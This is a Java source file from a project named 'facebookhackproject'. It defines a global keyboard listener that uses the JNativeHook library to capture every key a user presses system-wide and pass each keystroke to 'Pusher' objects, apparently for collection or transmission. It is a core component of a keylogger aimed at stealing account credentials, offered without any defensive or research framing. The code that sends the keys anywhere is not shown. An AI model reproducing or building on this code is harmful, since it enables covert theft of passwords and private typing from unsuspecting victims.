/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject;

import facebookhackproject.pushers.Pusher;
import java.util.ArrayList;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Kareem
 */
public class GlobalKeyListener implements NativeKeyListener {

    boolean listen = false;
    ArrayList<Pusher> pushers;

    public GlobalKeyListener(ArrayList<Pusher> pushers) {
        this.pushers = pushers;
    }

    public void startListening() {
        this.listen = true;
    }

    public void stopListening() {
        this.listen = false;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (this.listen) {
            String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
            
            this.pushers.stream().forEach((pusher) -> {
                pusher.addKeyPressed(keyPressed);
            });
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
